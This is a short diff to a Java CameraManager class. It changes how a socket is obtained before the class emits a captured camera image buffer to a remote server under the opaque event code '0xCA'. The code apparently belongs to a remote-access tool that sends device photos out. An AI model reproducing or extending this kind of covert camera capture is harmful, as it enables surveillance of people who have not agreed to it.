@@ -59,7 +59,7 @@ public class CameraManager {
             JSONObject object = new JSONObject();
             object.put("image",true);
             object.put("buffer" , bos.toByteArray());
-            IOSocket.getInstance().getIoSocket().emit("0xCA" , object);
+            IOSocket.getSocket().emit("0xCA" , object);
 
 
         } catch (JSONException e) {
